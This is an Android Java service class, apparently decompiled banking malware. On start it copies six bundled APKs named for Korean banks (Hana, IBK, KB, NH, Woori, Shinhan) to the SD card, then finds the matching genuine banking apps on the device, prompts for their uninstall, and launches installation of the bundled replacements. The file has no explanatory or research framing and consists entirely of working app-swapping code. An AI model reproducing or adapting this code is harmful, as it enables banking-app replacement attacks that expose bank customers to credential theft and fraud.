package com.example.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.pm.ResolveInfo.DisplayNameComparator;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Collections;
import java.util.List;

public class InstallService extends Service {
    public IBinder onBind(Intent arg0) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        copy(getApplicationContext(), "hannanbank.apk", "/sdcard/apk", "hannanbank.apk");
        copy(getApplicationContext(), "ibk.apk", "/sdcard/apk", "ibk.apk");
        copy(getApplicationContext(), "kb.apk", "/sdcard/apk", "kb.apk");
        copy(getApplicationContext(), "nhbank.apk", "/sdcard/apk", "nhbank.apk");
        copy(getApplicationContext(), "woori.apk", "/sdcard/apk", "woori.apk");
        copy(getApplicationContext(), "xinhan.apk", "/sdcard/apk", "xinhan.apk");
        removeApplications();
    }

    private void installApk(String filename) {
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.addFlags(268435456);
        intent.setDataAndType(Uri.fromFile(new File(filename)), "application/vnd.android.package-archive");
        startActivity(intent);
    }

    private void removeApplications() {
        PackageManager manager = getPackageManager();
        Intent mainIntent = new Intent("android.intent.action.MAIN", null);
        mainIntent.addCategory("android.intent.category.LAUNCHER");
        List<ResolveInfo> apps = manager.queryIntentActivities(mainIntent, 0);
        Collections.sort(apps, new DisplayNameComparator(manager));
        if (apps != null) {
            int count = apps.size();
            for (int i = 0; i < count; i++) {
                ApplicationInfo application = new ApplicationInfo();
                ResolveInfo info = (ResolveInfo) apps.get(i);
                ApplicationInfo pmAppInfo = info.activityInfo.applicationInfo;
                ApplicationInfo applicationInfo = info.activityInfo.applicationInfo;
                if ((pmAppInfo.flags & 1) > 0) {
                    StringBuilder stringBuilder = new StringBuilder();
                    ApplicationInfo applicationInfo2 = info.activityInfo.applicationInfo;
                    Log.i("appInfo", stringBuilder.append(1).toString());
                } else {
                    String str = info.activityInfo.applicationInfo.packageName;
                    File file;
                    if (str.equals("com.hanabank.ebk.channel.android.hananbank")) {
                        Log.d("find app", "----com.hanabank.ebk.channel.android.hananbank--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/hannanbank.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    } else if (str.equals("com.ibk.spbs")) {
                        Log.d("find app", "----com.ibk.spbs--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/ibk.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    } else if (str.equals("com.kbcard.kbkookmincard")) {
                        Log.d("find app", "----com.kbcard.kbkookmincard--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/kb.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    } else if (str.equals("nh.smart")) {
                        Log.d("find app", "----nh.smart--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/nhbank.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    } else if (str.equals("com.webcash.wooribank")) {
                        Log.d("find app", "----com.webcash.wooribank--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/woori.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    } else if (str.equals("com.shinhan.sbanking")) {
                        Log.d("find app", "----com.shinhan.sbanking--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/xinhan.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    }
                }
            }
        }
    }

    private void unInstallApp(String str) {
        Intent uninstallIntent = new Intent("android.intent.action.DELETE", Uri.parse("package:" + str));
        uninstallIntent.addFlags(268435456);
        startActivity(uninstallIntent);
    }

    public static void copy(Context myContext, String ASSETS_NAME, String savePath, String saveName) {
        String filename = new StringBuilder(String.valueOf(savePath)).append("/").append(saveName).toString();
        Log.i("file name ", "------" + filename);
        File dir = new File(savePath);
        if (!dir.exists()) {
            dir.mkdir();
        }
        try {
            File saveFile = new File(filename);
            if (!saveFile.exists()) {
                saveFile.createNewFile();
                InputStream is = myContext.getResources().getAssets().open(ASSETS_NAME);
                FileOutputStream fos = new FileOutputStream(filename);
                byte[] buffer = new byte[7168];
                while (true) {
                    int count = is.read(buffer);
                    if (count <= 0) {
                        fos.close();
                        is.close();
                        return;
                    }
                    fos.write(buffer, 0, count);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
